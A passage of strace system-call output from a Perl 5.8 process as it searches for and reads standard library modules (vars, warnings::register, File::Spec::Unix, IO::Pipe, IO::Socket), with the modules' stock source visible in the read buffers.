7695  07:19:58.093585 stat64("/usr/share/perl5/vars.pmc", 0xbffa039c) = -1 ENOENT (No such file or directory)
7695  07:19:58.093597 stat64("/usr/share/perl5/vars.pm", 0xbffa02ac) = -1 ENOENT (No such file or directory)
7695  07:19:58.093610 stat64("/usr/lib/perl/5.8/vars.pmc", 0xbffa039c) = -1 ENOENT (No such file or directory)
7695  07:19:58.093622 stat64("/usr/lib/perl/5.8/vars.pm", 0xbffa02ac) = -1 ENOENT (No such file or directory)
7695  07:19:58.093649 stat64("/usr/share/perl/5.8/vars.pmc", 0xbffa039c) = -1 ENOENT (No such file or directory)
7695  07:19:58.093661 stat64("/usr/share/perl/5.8/vars.pm", {st_mode=S_IFREG|0644, st_size=1149, ...}) = 0
7695  07:19:58.093681 open("/usr/share/perl/5.8/vars.pm", O_RDONLY|O_LARGEFILE) = 10
7695  07:19:58.093694 ioctl(10, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbffa00b8) = -1 ENOTTY (Inappropriate ioctl for device)
7695  07:19:58.093705 _llseek(10, 0, [0], SEEK_CUR) = 0
7695  07:19:58.093722 read(10, "package vars;\n\nuse 5.006;\n\nour $VERSION = \'1.01\';\n\nuse warnings::register;\nuse strict qw(vars subs);\n\nsub import {\n    my $callpack = caller;\n    my ($pack, @imports) = @_;\n    my ($sym, $ch);\n    foreach (@imports) {\n        if (($ch, $sym) = /^([\\$\\@\\%\\*\\&])(.+)/) {\n\t    if ($sym =~ /\\W/) {\n\t\t# time for a more-detailed check-up\n\t\tif ($sym =~ /^\\w+[[{].*[]}]$/) {\n\t\t    require Carp;\n\t\t    Carp::croak(\"Can\'t declare individual elements of hash or array\");\n\t\t} elsif (warnings::enabled() and length($sym) == 1 and $sym !~ tr/a-zA-Z//) {\n\t\t    warnings::warn(\"No need to declare built-in vars\");\n\t\t} elsif  (($^H &= strict::bits(\'vars\'))) {\n\t\t    require Carp;\n\t\t    Carp::croak(\"\'$_\' is not a valid variable name under strict vars\");\n\t\t}\n\t    }\n\t    $sym = \"${callpack}::$sym\" unless $sym =~ /::/;\n\t    *$sym =\n\t\t(  $ch eq \"\\$\" ? \\$$sym\n\t\t : $ch eq \"\\@\" ? \\@$sym\n\t\t : $ch eq \"\\%\" ? \\%$sym\n\t\t : $ch eq \"\\*\" ? \\*$sym\n\t\t : $ch eq \"\\&\" ? \\&$sym \n\t\t : do {\n\t\t     require Carp;\n\t\t     Carp::croak(\"\'$_\' is not a valid variable name\");\n\t\t });\n\t} else {\n\t    require Carp;\n\t    Carp::croak(\"\'$_\' is not a valid variable name\");\n\t}\n    }\n};\n\n1;\n__END__\n\n", 4096) = 1149
7695  07:19:58.093835 stat64("/etc/perl/warnings/register.pmc", 0xbff9feec) = -1 ENOENT (No such file or directory)
7695  07:19:58.093849 stat64("/etc/perl/warnings/register.pm", 0xbff9fdfc) = -1 ENOENT (No such file or directory)
7695  07:19:58.093862 stat64("/usr/local/lib/perl/5.8.8/warnings/register.pmc", 0xbff9feec) = -1 ENOENT (No such file or directory)
7695  07:19:58.093875 stat64("/usr/local/lib/perl/5.8.8/warnings/register.pm", 0xbff9fdfc) = -1 ENOENT (No such file or directory)
7695  07:19:58.093889 stat64("/usr/local/share/perl/5.8.8/warnings/register.pmc", 0xbff9feec) = -1 ENOENT (No such file or directory)
7695  07:19:58.093902 stat64("/usr/local/share/perl/5.8.8/warnings/register.pm", 0xbff9fdfc) = -1 ENOENT (No such file or directory)
7695  07:19:58.093916 stat64("/usr/lib/perl5/warnings/register.pmc", 0xbff9feec) = -1 ENOENT (No such file or directory)
7695  07:19:58.093929 stat64("/usr/lib/perl5/warnings/register.pm", 0xbff9fdfc) = -1 ENOENT (No such file or directory)
7695  07:19:58.093942 stat64("/usr/share/perl5/warnings/register.pmc", 0xbff9feec) = -1 ENOENT (No such file or directory)
7695  07:19:58.093954 stat64("/usr/share/perl5/warnings/register.pm", 0xbff9fdfc) = -1 ENOENT (No such file or directory)
7695  07:19:58.093967 stat64("/usr/lib/perl/5.8/warnings/register.pmc", 0xbff9feec) = -1 ENOENT (No such file or directory)
7695  07:19:58.093980 stat64("/usr/lib/perl/5.8/warnings/register.pm", 0xbff9fdfc) = -1 ENOENT (No such file or directory)
7695  07:19:58.093994 stat64("/usr/share/perl/5.8/warnings/register.pmc", 0xbff9feec) = -1 ENOENT (No such file or directory)
7695  07:19:58.094031 stat64("/usr/share/perl/5.8/warnings/register.pm", {st_mode=S_IFREG|0644, st_size=732, ...}) = 0
7695  07:19:58.094070 open("/usr/share/perl/5.8/warnings/register.pm", O_RDONLY|O_LARGEFILE) = 11
7695  07:19:58.094085 ioctl(11, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbff9fc08) = -1 ENOTTY (Inappropriate ioctl for device)
7695  07:19:58.094095 _llseek(11, 0, [0], SEEK_CUR) = 0
7695  07:19:58.094113 read(11, "package warnings::register;\n\nour $VERSION = \'1.01\';\n\nrequire warnings;\n\nsub mkMask\n{\n    my ($bit) = @_;\n    my $mask = \"\";\n\n    vec($mask, $bit, 1) = 1;\n    return $mask;\n}\n\nsub import\n{\n    shift;\n    my $package = (caller(0))[0];\n    if (! defined $warnings::Bits{$package}) {\n        $warnings::Bits{$package}     = mkMask($warnings::LAST_BIT);\n        vec($warnings::Bits{\'all\'}, $warnings::LAST_BIT, 1) = 1;\n        $warnings::Offsets{$package}  = $warnings::LAST_BIT ++;\n\tforeach my $k (keys %warnings::Bits) {\n\t    vec($warnings::Bits{$k}, $warnings::LAST_BIT, 1) = 0;\n\t}\n        $warnings::DeadBits{$package} = mkMask($warnings::LAST_BIT);\n        vec($warnings::DeadBits{\'all\'}, $warnings::LAST_BIT++, 1) = 1;\n    }\n}\n\n1;\n", 4096) = 732
7695  07:19:58.094253 read(11, "", 4096) = 0
7695  07:19:58.094266 close(11)         = 0
7695  07:19:58.094459 _llseek(10, 1148, [1148], SEEK_SET) = 0
7695  07:19:58.094475 _llseek(10, 0, [1148], SEEK_CUR) = 0
7695  07:19:58.094485 close(10)         = 0
7695  07:19:58.094596 _llseek(8, 594, [594], SEEK_SET) = 0
7695  07:19:58.094625 _llseek(8, 0, [594], SEEK_CUR) = 0
7695  07:19:58.094636 close(8)          = 0
7695  07:19:58.094669 stat64("/etc/perl/File/Spec/Unix.pmc", 0xbffa084c) = -1 ENOENT (No such file or directory)
7695  07:19:58.094685 stat64("/etc/perl/File/Spec/Unix.pm", 0xbffa075c) = -1 ENOENT (No such file or directory)
7695  07:19:58.094699 stat64("/usr/local/lib/perl/5.8.8/File/Spec/Unix.pmc", 0xbffa084c) = -1 ENOENT (No such file or directory)
7695  07:19:58.094716 stat64("/usr/local/lib/perl/5.8.8/File/Spec/Unix.pm", 0xbffa075c) = -1 ENOENT (No such file or directory)
7695  07:19:58.094730 stat64("/usr/local/share/perl/5.8.8/File/Spec/Unix.pmc", 0xbffa084c) = -1 ENOENT (No such file or directory)
7695  07:19:58.094743 stat64("/usr/local/share/perl/5.8.8/File/Spec/Unix.pm", 0xbffa075c) = -1 ENOENT (No such file or directory)
7695  07:19:58.094758 stat64("/usr/lib/perl5/File/Spec/Unix.pmc", 0xbffa084c) = -1 ENOENT (No such file or directory)
7695  07:19:58.094770 stat64("/usr/lib/perl5/File/Spec/Unix.pm", 0xbffa075c) = -1 ENOENT (No such file or directory)
7695  07:19:58.094784 stat64("/usr/share/perl5/File/Spec/Unix.pmc", 0xbffa084c) = -1 ENOENT (No such file or directory)
7695  07:19:58.094796 stat64("/usr/share/perl5/File/Spec/Unix.pm", 0xbffa075c) = -1 ENOENT (No such file or directory)
7695  07:19:58.094810 stat64("/usr/lib/perl/5.8/File/Spec/Unix.pmc", 0xbffa084c) = -1 ENOENT (No such file or directory)
7695  07:19:58.094823 stat64("/usr/lib/perl/5.8/File/Spec/Unix.pm", 0xbffa075c) = -1 ENOENT (No such file or directory)
7695  07:19:58.094837 stat64("/usr/share/perl/5.8/File/Spec/Unix.pmc", 0xbffa084c) = -1 ENOENT (No such file or directory)
7695  07:19:58.094850 stat64("/usr/share/perl/5.8/File/Spec/Unix.pm", {st_mode=S_IFREG|0644, st_size=7038, ...}) = 0
7695  07:19:58.094872 open("/usr/share/perl/5.8/File/Spec/Unix.pm", O_RDONLY|O_LARGEFILE) = 8
7695  07:19:58.094887 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbffa0568) = -1 ENOTTY (Inappropriate ioctl for device)
7695  07:19:58.094899 _llseek(8, 0, [0], SEEK_CUR) = 0
7695  07:19:58.094917 read(8, "package File::Spec::Unix;\n\nuse strict;\nuse vars qw($VERSION);\n\n$VERSION = \'1.5\';\n\nsub canonpath {\n    my ($self,$path) = @_;\n    \n    # Handle POSIX-style node names beginning with double slash (qnx, nto)\n    # Handle network path names beginning with double slash (cygwin)\n    # (POSIX says: \"a pathname that begins with two successive slashes\n    # may be interpreted in an implementation-defined manner, although\n    # more than two leading slashes shall be treated as a single slash.\")\n    my $node = \'\';\n    if ( $^O =~ m/^(?:qnx|nto|cygwin)$/ && $path =~ s:^(//[^/]+)(/|\\z):/:s ) {\n      $node = $1;\n    }\n    # This used to be\n    # $path =~ s|/+|/|g unless($^O eq \'cygwin\');\n    # but that made tests 29, 30, 35, 46, and 213 (as of #13272) to fail\n    # (Mainly because trailing \"\" directories didn\'t get stripped).\n    # Why would cygwin avoid collapsing multiple slashes into one? --jhi\n    $path =~ s|/+|/|g;                             # xx////xx  -> xx/xx\n    $path =~ s@(/\\.)+(/|\\Z(?!\\n))@/@g;             # xx/././xx -> xx/xx\n    $path =~ s|^(\\./)+||s unless $path eq \"./\";    # ./xx      -> xx\n    $path =~ s|^/(\\.\\./)+|/|;                      # /../../xx -> xx\n    $path =~ s|^/\\.\\.$|/|;                         # /..       -> /\n    $path =~ s|/\\Z(?!\\n)|| unless $path eq \"/\";          # xx/       -> xx\n    return \"$node$path\";\n}\n\nsub catdir {\n    my $self = shift;\n\n    $self->canonpath(join(\'/\', @_, \'\')); # \'\' because need a trailing \'/\'\n}\n\nsub catfile {\n    my $self = shift;\n    my $file = $self->canonpath(pop @_);\n    return $file unless @_;\n    my $dir = $self->catdir(@_);\n    $dir .= \"/\" unless substr($dir,-1) eq \"/\";\n    return $dir.$file;\n}\n\nsub curdir () { \'.\' }\n\nsub devnull () { \'/dev/null\' }\n\nsub rootdir () { \'/\' }\n\nmy $tmpdir;\nsub _tmpdir {\n    return $tmpdir if defined $tmpdir;\n    my $self = shift;\n    my @dirlist = @_;\n    {\n\tno strict \'refs\';\n\tif (${\"\\cTAINT\"}) { # Check for taint mode on perl >= 5.8.0\n            require Scalar::Util;\n\t    @dirlist = grep { ! Scalar::Util::tainted($_) } @dirlist;\n\t}\n    }\n    foreach (@dirlist) {\n\tnext unless defined && -d && -w _;\n\t$tmpdir = $_;\n\tlast;\n    }\n    $tmpdir = $self->curdir unless defined $tmpdir;\n    $tmpdir = defined $tmpdir && $self->canonpath($tmpdir);\n    return $tmpdir;\n}\n\nsub tmpdir {\n    return $tmpdir if defined $tmpdir;\n    $tmpdir = $_[0]->_tmpdir( $ENV{TMPDIR}, \"/tmp\" );\n}\n\nsub updir () { \'..\' }\n\nsub no_upwards {\n    my $self = shift;\n    return grep(!/^\\.{1,2}\\Z(?!\\n)/s, @_);\n}\n\nsub case_tolerant () { 0 }\n\nsub file_name_is_absolute {\n    my ($self,$file) = @_;\n    return scalar($file =~ m:^/:s);\n}\n\nsub path {\n    return () unless exists $ENV{PATH};\n    my @path = split(\':\', $ENV{PATH});\n    foreach (@path) { $_ = \'.\' if $_ eq \'\' }\n    return @path;\n}\n\nsub join {\n    my $self = shift;\n    return $self->catfile(@_);\n}\n\nsub splitpath {\n    my ($self,$path, $nofile) = @_;\n\n    my ($volume,$directory,$file) = (\'\',\'\',\'\');\n\n    if ( $nofile ) {\n        $directory = $path;\n    }\n    else {\n        $path =~ m|^ ( (?: .* / (?: \\.\\.?\\Z(?!\\n) )? )? ) ([^/]*) |xs;\n        $directory = $1;\n        $file      = $2;\n    }\n\n    return ($volume,$directory,$file);\n}\n\nsub splitdir {\n    return split m|/|, $_[1], -1;  # Preserve trailing fields\n}\n\nsub catpath {\n    my ($self,$volume,$directory,$file) = @_;\n\n    if ( $directory ne \'\'                && \n         $file ne \'\'                     && \n         substr( $directory, -1 ) ne \'/\' && \n         substr( $file, 0, 1 ) ne \'/\' \n    ) {\n        $directory .= \"/$file\" ;\n    }\n    else {\n        $directory .= $file ;\n    }\n\n    return $directory ;\n}\n\nsub abs2rel {\n    my($self,$path,$base) = @_;\n\n    # Figure out the effective $base and clean it up.\n    if ( !defined( $base ) || $base eq \'\' ) {\n        $base = $self->_cwd();\n    }\n    elsif ( ! $self->file_name_is_absolute( $base ) ) {\n\tif ( ! $self->file_name_is_absolute( $path ) ) {\n\t    # optimisation where both paths are relative: save 2 x cwd\n\t    $base = $self->canonpath( \"/$base\" );\n\t    $path = \"/$path\";\n\t}\n\telse {\n\t    $base = $self->rel2abs( $base ) ;\n\t}\n    }\n  ", 4096) = 4096
7695  07:19:58.095672 brk(0x8218000)    = 0x8218000
7695  07:19:58.100033 read(8, "  else {\n        $base = $self->canonpath( $base ) ;\n    }\n\n    # Clean up $path\n    if ( ! $self->file_name_is_absolute( $path ) ) {\n        $path = $self->rel2abs( $path ) ;\n    }\n    else {\n        $path = $self->canonpath( $path ) ;\n    }\n\n    # Now, remove all leading components that are the same\n    my @pathchunks = $self->splitdir( $path);\n    my @basechunks = $self->splitdir( $base);\n\n    while (@pathchunks && @basechunks && $pathchunks[0] eq $basechunks[0]) {\n        shift @pathchunks ;\n        shift @basechunks ;\n    }\n\n    $path = CORE::join( \'/\', @pathchunks );\n    $base = CORE::join( \'/\', @basechunks );\n\n    # $base now contains the directories the resulting relative path \n    # must ascend out of before it can descend to $path_directory.  So, \n    # replace all names with $parentDir\n    $base =~ s|[^/]+|..|g ;\n\n    # Glue the two together, using a separator if necessary, and preventing an\n    # empty result.\n    if ( $path ne \'\' && $base ne \'\' ) {\n        $path = \"$base/$path\" ;\n    } else {\n        $path = \"$base$path\" ;\n    }\n\n    return $self->canonpath( $path ) ;\n}\n\nsub rel2abs {\n    my ($self,$path,$base ) = @_;\n\n    # Clean up $path\n    if ( ! $self->file_name_is_absolute( $path ) ) {\n        # Figure out the effective $base and clean it up.\n        if ( !defined( $base ) || $base eq \'\' ) {\n\t    $base = $self->_cwd();\n        }\n        elsif ( ! $self->file_name_is_absolute( $base ) ) {\n            $base = $self->rel2abs( $base ) ;\n        }\n        else {\n            $base = $self->canonpath( $base ) ;\n        }\n\n        # Glom them together\n        $path = $self->catdir( $base, $path ) ;\n    }\n\n    return $self->canonpath( $path ) ;\n}\n\n# Internal routine to File::Spec, no point in making this public since\n# it is the standard Cwd interface.  Most of the platform-specific\n# File::Spec subclasses use this.\nsub _cwd {\n    require Cwd;\n    Cwd::cwd();\n}\n\n# Internal method to reduce xx\\..\\yy -> yy\nsub _collapse {\n    my($fs, $path) = @_;\n\n    my $updir  = $fs->updir;\n    my $curdir = $fs->curdir;\n\n    my($vol, $dirs, $file) = $fs->splitpath($path);\n    my @dirs = $fs->splitdir($dirs);\n\n    my @collapsed;\n    foreach my $dir (@dirs) {\n        if( $dir eq $updir              and   # if we have an updir\n            @collapsed                  and   # and something to collapse\n            length $collapsed[-1]       and   # and its not the rootdir\n            $collapsed[-1] ne $updir    and   # nor another updir\n            $collapsed[-1] ne $curdir         # nor the curdir\n          ) \n        {                                     # then\n            pop @collapsed;                   # collapse\n        }\n        else {                                # else\n            push @collapsed, $dir;            # just hang onto it\n        }\n    }\n\n    return $fs->catpath($vol,\n                        $fs->catdir(@collapsed),\n                        $file\n                       );\n}\n\n1;\n", 4096) = 2942
7695  07:19:58.100424 read(8, "", 4096) = 0
7695  07:19:58.100441 close(8)          = 0
7695  07:19:58.100634 read(6, "", 4096) = 0
7695  07:19:58.100648 close(6)          = 0
7695  07:19:58.100815 stat64("/etc/perl/IO/Pipe.pmc", 0xbffa0cfc) = -1 ENOENT (No such file or directory)
7695  07:19:58.100831 stat64("/etc/perl/IO/Pipe.pm", 0xbffa0c0c) = -1 ENOENT (No such file or directory)
7695  07:19:58.100855 stat64("/usr/local/lib/perl/5.8.8/IO/Pipe.pmc", 0xbffa0cfc) = -1 ENOENT (No such file or directory)
7695  07:19:58.100870 stat64("/usr/local/lib/perl/5.8.8/IO/Pipe.pm", 0xbffa0c0c) = -1 ENOENT (No such file or directory)
7695  07:19:58.100884 stat64("/usr/local/share/perl/5.8.8/IO/Pipe.pmc", 0xbffa0cfc) = -1 ENOENT (No such file or directory)
7695  07:19:58.100897 stat64("/usr/local/share/perl/5.8.8/IO/Pipe.pm", 0xbffa0c0c) = -1 ENOENT (No such file or directory)
7695  07:19:58.100911 stat64("/usr/lib/perl5/IO/Pipe.pmc", 0xbffa0cfc) = -1 ENOENT (No such file or directory)
7695  07:19:58.100923 stat64("/usr/lib/perl5/IO/Pipe.pm", 0xbffa0c0c) = -1 ENOENT (No such file or directory)
7695  07:19:58.100936 stat64("/usr/share/perl5/IO/Pipe.pmc", 0xbffa0cfc) = -1 ENOENT (No such file or directory)
7695  07:19:58.100948 stat64("/usr/share/perl5/IO/Pipe.pm", 0xbffa0c0c) = -1 ENOENT (No such file or directory)
7695  07:19:58.100961 stat64("/usr/lib/perl/5.8/IO/Pipe.pmc", 0xbffa0cfc) = -1 ENOENT (No such file or directory)
7695  07:19:58.100974 stat64("/usr/lib/perl/5.8/IO/Pipe.pm", {st_mode=S_IFREG|0644, st_size=3426, ...}) = 0
7695  07:19:58.100996 open("/usr/lib/perl/5.8/IO/Pipe.pm", O_RDONLY|O_LARGEFILE) = 6
7695  07:19:58.101011 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbffa0a18) = -1 ENOTTY (Inappropriate ioctl for device)
7695  07:19:58.101022 _llseek(6, 0, [0], SEEK_CUR) = 0
7695  07:19:58.101044 read(6, "# IO::Pipe.pm\n#\n# Copyright (c) 1996-8 Graham Barr <gbarr@pobox.com>. All rights reserved.\n# This program is free software; you can redistribute it and/or\n# modify it under the same terms as Perl itself.\n\npackage IO::Pipe;\n\nuse 5.006_001;\n\nuse IO::Handle;\nuse strict;\nour($VERSION);\nuse Carp;\nuse Symbol;\n\n$VERSION = \"1.13\";\n\nsub new {\n    my $type = shift;\n    my $class = ref($type) || $type || \"IO::Pipe\";\n    @_ == 0 || @_ == 2 or croak \"usage: new $class [READFH, WRITEFH]\";\n\n    my $me = bless gensym(), $class;\n\n    my($readfh,$writefh) = @_ ? @_ : $me->handles;\n\n    pipe($readfh, $writefh)\n\tor return undef;\n\n    @{*$me} = ($readfh, $writefh);\n\n    $me;\n}\n\nsub handles {\n    @_ == 1 or croak \'usage: $pipe->handles()\';\n    (IO::Pipe::End->new(), IO::Pipe::End->new());\n}\n\nmy $do_spawn = $^O eq \'os2\' || $^O eq \'MSWin32\';\n\nsub _doit {\n    my $me = shift;\n    my $rw = shift;\n\n    my $pid = $do_spawn ? 0 : fork();\n\n    if($pid) { # Parent\n        return $pid;\n    }\n    elsif(defined $pid) { # Child or spawn\n        my $fh;\n        my $io = $rw ? \\*STDIN : \\*STDOUT;\n        my ($mode, $save) = $rw ? \"r\" : \"w\";\n        if ($do_spawn) {\n          require Fcntl;\n          $save = IO::Handle->new_from_fd($io, $mode);\n\t  my $handle = shift;\n          # Close in child:\n\t  unless ($^O eq \'MSWin32\') {\n            fcntl($handle, Fcntl::F_SETFD(), 1) or croak \"fcntl: $!\";\n\t  }\n          $fh = $rw ? ${*$me}[0] : ${*$me}[1];\n        } else {\n          shift;\n          $fh = $rw ? $me->reader() : $me->writer(); # close the other end\n        }\n        bless $io, \"IO::Handle\";\n        $io->fdopen($fh, $mode);\n\t$fh->close;\n\n        if ($do_spawn) {\n          $pid = eval { system 1, @_ }; # 1 == P_NOWAIT\n          my $err = $!;\n    \n          $io->fdopen($save, $mode);\n          $save->close or croak \"Cannot close $!\";\n          croak \"IO::Pipe: Cannot spawn-NOWAIT: $err\" if not $pid or $pid < 0;\n          return $pid;\n        } else {\n          exec @_ or\n            croak \"IO::Pipe: Cannot exec: $!\";\n        }\n    }\n    else {\n        croak \"IO::Pipe: Cannot fork: $!\";\n    }\n\n    # NOT Reached\n}\n\nsub reader {\n    @_ >= 1 or croak \'usage: $pipe->reader( [SUB_COMMAND_ARGS] )\';\n    my $me = shift;\n\n    return undef\n\tunless(ref($me) || ref($me = $me->new));\n\n    my $fh  = ${*$me}[0];\n    my $pid;\n    $pid = $me->_doit(0, $fh, @_)\n        if(@_);\n\n    close ${*$me}[1];\n    bless $me, ref($fh);\n    *$me = *$fh;          # Alias self to handle\n    $me->fdopen($fh->fileno,\"r\")\n\tunless defined($me->fileno);\n    bless $fh;                  # Really wan\'t un-bless here\n    ${*$me}{\'io_pipe_pid\'} = $pid\n        if defined $pid;\n\n    $me;\n}\n\nsub writer {\n    @_ >= 1 or croak \'usage: $pipe->writer( [SUB_COMMAND_ARGS] )\';\n    my $me = shift;\n\n    return undef\n\tunless(ref($me) || ref($me = $me->new));\n\n    my $fh  = ${*$me}[1];\n    my $pid;\n    $pid = $me->_doit(1, $fh, @_)\n        if(@_);\n\n    close ${*$me}[0];\n    bless $me, ref($fh);\n    *$me = *$fh;          # Alias self to handle\n    $me->fdopen($fh->fileno,\"w\")\n\tunless defined($me->fileno);\n    bless $fh;                  # Really wan\'t un-bless here\n    ${*$me}{\'io_pipe_pid\'} = $pid\n        if defined $pid;\n\n    $me;\n}\n\npackage IO::Pipe::End;\n\nour(@ISA);\n\n@ISA = qw(IO::Handle);\n\nsub close {\n    my $fh = shift;\n    my $r = $fh->SUPER::close(@_);\n\n    waitpid(${*$fh}{\'io_pipe_pid\'},0)\n\tif(defined ${*$fh}{\'io_pipe_pid\'});\n\n    $r;\n}\n\n1;\n\n__END__\n\n", 4096) = 3426
7695  07:19:58.101700 _llseek(6, 3425, [3425], SEEK_SET) = 0
7695  07:19:58.101718 _llseek(6, 0, [3425], SEEK_CUR) = 0
7695  07:19:58.101729 close(6)          = 0
7695  07:19:58.101753 stat64("/etc/perl/IO/Socket.pmc", 0xbffa0cfc) = -1 ENOENT (No such file or directory)
7695  07:19:58.101767 stat64("/etc/perl/IO/Socket.pm", 0xbffa0c0c) = -1 ENOENT (No such file or directory)
7695  07:19:58.101781 stat64("/usr/local/lib/perl/5.8.8/IO/Socket.pmc", 0xbffa0cfc) = -1 ENOENT (No such file or directory)
7695  07:19:58.101794 stat64("/usr/local/lib/perl/5.8.8/IO/Socket.pm", 0xbffa0c0c) = -1 ENOENT (No such file or directory)
7695  07:19:58.101808 stat64("/usr/local/share/perl/5.8.8/IO/Socket.pmc", 0xbffa0cfc) = -1 ENOENT (No such file or directory)
7695  07:19:58.101820 stat64("/usr/local/share/perl/5.8.8/IO/Socket.pm", 0xbffa0c0c) = -1 ENOENT (No such file or directory)
7695  07:19:58.101835 stat64("/usr/lib/perl5/IO/Socket.pmc", 0xbffa0cfc) = -1 ENOENT (No such file or directory)
7695  07:19:58.101858 stat64("/usr/lib/perl5/IO/Socket.pm", 0xbffa0c0c) = -1 ENOENT (No such file or directory)
7695  07:19:58.101913 stat64("/usr/share/perl5/IO/Socket.pmc", 0xbffa0cfc) = -1 ENOENT (No such file or directory)
7695  07:19:58.101925 stat64("/usr/share/perl5/IO/Socket.pm", 0xbffa0c0c) = -1 ENOENT (No such file or directory)
7695  07:19:58.101939 stat64("/usr/lib/perl/5.8/IO/Socket.pmc", 0xbffa0cfc) = -1 ENOENT (No such file or directory)
7695  07:19:58.101951 stat64("/usr/lib/perl/5.8/IO/Socket.pm", {st_mode=S_IFREG|0644, st_size=6699, ...}) = 0
7695  07:19:58.101973 open("/usr/lib/perl/5.8/IO/Socket.pm", O_RDONLY|O_LARGEFILE) = 6
7695  07:19:58.101987 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbffa0a18) = -1 ENOTTY (Inappropriate ioctl for device)
7695  07:19:58.102003 _llseek(6, 0, [0], SEEK_CUR) = 0
7695  07:19:58.102021 read(6, "# IO::Socket.pm\n#\n# Copyright (c) 1997-8 Graham Barr <gbarr@pobox.com>. All rights reserved.\n# This program is free software; you can redistribute it and/or\n# modify it under the same terms as Perl itself.\n\npackage IO::Socket;\n\nrequire 5.006;\n\nuse IO::Handle;\nuse Socket 1.3;\nuse Carp;\nuse strict;\nour(@ISA, $VERSION, @EXPORT_OK);\nuse Exporter;\nuse Errno;\n\n# legacy\n\nrequire IO::Socket::INET;\nrequire IO::Socket::UNIX if ($^O ne \'epoc\' && $^O ne \'symbian\');\n\n@ISA = qw(IO::Handle);\n\n$VERSION = \"1.29\";\n\n@EXPORT_OK = qw(sockatmark);\n\nsub import {\n    my $pkg = shift;\n    if (@_ && $_[0] eq \'sockatmark\') { # not very extensible but for now, fast\n\tExporter::export_to_level(\'IO::Socket\', 1, $pkg, \'sockatmark\');\n    } else {\n\tmy $callpkg = caller;\n\tExporter::export \'Socket\', $callpkg, @_;\n    }\n}\n\nsub new {\n    my($class,%arg) = @_;\n    my $sock = $class->SUPER::new();\n\n    $sock->autoflush(1);\n\n    ${*$sock}{\'io_socket_timeout\'} = delete $arg{Timeout};\n\n    return scalar(%arg) ? $sock->configure(\\%arg)\n\t\t\t: $sock;\n}\n\nmy @domain2pkg;\n\nsub register_domain {\n    my($p,$d) = @_;\n    $domain2pkg[$d] = $p;\n}\n\nsub configure {\n    my($sock,$arg) = @_;\n    my $domain = delete $arg->{Domain};\n\n    croak \'IO::Socket: Cannot configure a generic socket\'\n\tunless defined $domain;\n\n    croak \"IO::Socket: Unsupported socket domain\"\n\tunless defined $domain2pkg[$domain];\n\n    croak \"IO::Socket: Cannot configure socket in domain \'$domain\'\"\n\tunless ref($sock) eq \"IO::Socket\";\n\n    bless($sock, $domain2pkg[$domain]);\n    $sock->configure($arg);\n}\n\nsub socket {\n    @_ == 4 or croak \'usage: $sock->socket(DOMAIN, TYPE, PROTOCOL)\';\n    my($sock,$domain,$type,$protocol) = @_;\n\n    socket($sock,$domain,$type,$protocol) or\n    \treturn undef;\n\n    ${*$sock}{\'io_socket_domain\'} = $domain;\n    ${*$sock}{\'io_socket_type\'}   = $type;\n    ${*$sock}{\'io_socket_proto\'}  = $protocol;\n\n    $sock;\n}\n\nsub socketpair {\n    @_ == 4 || croak \'usage: IO::Socket->socketpair(DOMAIN, TYPE, PROTOCOL)\';\n    my($class,$domain,$type,$protocol) = @_;\n    my $sock1 = $class->new();\n    my $sock2 = $class->new();\n\n    socketpair($sock1,$sock2,$domain,$type,$protocol) or\n    \treturn ();\n\n    ${*$sock1}{\'io_socket_type\'}  = ${*$sock2}{\'io_socket_type\'}  = $type;\n    ${*$sock1}{\'io_socket_proto\'} = ${*$sock2}{\'io_socket_proto\'} = $protocol;\n\n    ($sock1,$sock2);\n}\n\nsub connect {\n    @_ == 2 or croak \'usage: $sock->connect(NAME)\';\n    my $sock = shift;\n    my $addr = shift;\n    my $timeout = ${*$sock}{\'io_socket_timeout\'};\n    my $err;\n    my $blocking;\n\n    $blocking = $sock->blocking(0) if $timeout;\n    if (!connect($sock, $addr)) {\n\tif (defined $timeout && $!{EINPROGRESS}) {\n\t    require IO::Select;\n\n\t    my $sel = new IO::Select $sock;\n\n\t    if (!$sel->can_write($timeout)) {\n\t\t$err = $! || (exists &Errno::ETIMEDOUT ? &Errno::ETIMEDOUT : 1);\n\t\t$@ = \"connect: timeout\";\n\t    }\n\t    elsif (!connect($sock,$addr) && not $!{EISCONN}) {\n\t\t# Some systems refuse to re-connect() to\n\t\t# an already open socket and set errno to EISCONN.\n\t\t$err = $!;\n\t\t$@ = \"connect: $!\";\n\t    }\n\t}\n        elsif ($blocking || !$!{EINPROGRESS})  {\n\t    $err = $!;\n\t    $@ = \"connect: $!\";\n\t}\n    }\n\n    $sock->blocking(1) if $blocking;\n\n    $! = $err if $err;\n\n    $err ? undef : $sock;\n}\n\nsub bind {\n    @_ == 2 or croak \'usage: $sock->bind(NAME)\';\n    my $sock = shift;\n    my $addr = shift;\n\n    return bind($sock, $addr) ? $sock\n\t\t\t      : undef;\n}\n\nsub listen {\n    @_ >= 1 && @_ <= 2 or croak \'usage: $sock->listen([QUEUE])\';\n    my($sock,$queue) = @_;\n    $queue = 5\n\tunless $queue && $queue > 0;\n\n    return listen($sock, $queue) ? $sock\n\t\t\t\t : undef;\n}\n\nsub accept {\n    @_ == 1 || @_ == 2 or croak \'usage $sock->accept([PKG])\';\n    my $sock = shift;\n    my $pkg = shift || $sock;\n    my $timeout = ${*$sock}{\'io_socket_timeout\'};\n    my $new = $pkg->new(Timeout => $timeout);\n    my $peer = undef;\n\n    if(defined $timeout) {\n\trequire IO::Select;\n\n\tmy $sel = new IO::Select $sock;\n\n\tunless ($sel->can_read($timeout)) {\n\t    $@ = \'accept: timeout\';\n\t    $! = (exists &Errno::ETIMEDOUT ? &Errno::ETIMEDOUT : 1);\n\t    return;\n\t}\n", 4096) = 4096
7695  07:19:58.102379 stat64("/etc/perl/Socket.pmc", 0xbffa084c) = -1 ENOENT (No such file or directory)
7695  07:19:58.102411 stat64("/etc/perl/Socket.pm", 0xbffa075c) = -1 ENOENT (No such file or directory)
7695  07:19:58.102424 stat64("/usr/local/lib/perl/5.8.8/Socket.pmc", 0xbffa084c) = -1 ENOENT (No such file or directory)
7695  07:19:58.102437 stat64("/usr/local/lib/perl/5.8.8/Socket.pm", 0xbffa075c) = -1 ENOENT (No such file or directory)
7695  07:19:58.102451 stat64("/usr/local/share/perl/5.8.8/Socket.pmc", 0xbffa084c) = -1 ENOENT (No such file or directory)
